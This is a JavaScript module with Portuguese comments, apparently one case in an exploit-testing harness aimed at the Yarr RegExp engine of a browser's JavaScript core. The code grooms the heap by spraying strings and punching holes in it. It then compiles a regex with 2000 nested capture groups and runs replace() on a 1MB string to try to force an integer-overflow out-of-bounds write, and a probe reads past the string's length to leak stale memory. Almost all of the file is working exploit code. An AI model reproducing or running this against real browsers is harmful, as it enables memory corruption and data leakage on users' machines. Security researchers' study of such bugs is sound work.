import { Groomer } from '../mod_groomer.js';

export default {
    id:       'REGEXP_GROUP_INTEGER_OVERFLOW',
    category: 'CoreJS',
    risk:     'CRITICAL',
    description:
        'Ataque ao interpretador Yarr RegExp. Força a compilação de uma Regex com um número massivo ' +
        'de grupos de captura aninhados, combinada com uma string alvo gigante. Explora o cálculo de ' +
        'offsets de memória C++ durante a execução do método replace().',

    setup: function() {
        this.results = {};
        
        // 1. Fragmentamos o Heap de Strings para garantir que o C++ usa buracos (holes)
        this.trash = Groomer.sprayStrings(1000, 1024 * 512); // Pedaços de 512KB
        Groomer.punchHoles(this.trash, 3);

        // 2. Criamos uma Regex maligna com o máximo de grupos aninhados possível
        // Limite prático para não dar Stack Overflow síncrono no interpretador
        let regexStr = "(";
        for (let i = 0; i < 2000; i++) regexStr += "(a?)";
        regexStr += ")";
        
        this.evilRegex = new RegExp(regexStr, 'g');
        this.targetStr = "A".repeat(1024 * 1024); // 1MB String
    },

    trigger: function() {
        try {
            // O GATILHO: 
            // O C++ vai alocar um buffer para os matches. Se o cálculo de 
            // (Número de Grupos * Tamanho da String) transbordar os 32-bits,
            // o replace vai sobrescrever a memória vizinha (OOB Write).
            this.results.corrupted = this.targetStr.replace(this.evilRegex, "B");
        } catch(e) {
            this.results.error = e.message;
        }
    },

    probe: [
        // Probe 0: O Yarr sobreviveu ou atirou erro de "Too many captures"?
        s => s.results.error || 'Regex Compilada e Executada',
        
        // Probe 1: O Extrator de STALE DATA / LEAK
        s => {
            if (s.results.corrupted && s.results.corrupted.length > 0) {
                try {
                    // Tentamos ler um caractere fora do limite lógico.
                    // Se o Yarr corrompeu o cabeçalho da StringImpl, o length será falso.
                    let charCode = s.results.corrupted.charCodeAt(s.targetStr.length + 100);
                    if (!isNaN(charCode) && charCode !== 65 && charCode !== 66) {
                        return charCode; // Retorna número bruto para acionar o HUD Vermelho
                    }
                } catch(e) {}
            }
            return 0; // Seguro
        }
    ],

    cleanup: function() {
        this.evilRegex = null;
        this.targetStr = null;
        this.results = {};
        this.trash = null;
    }
};
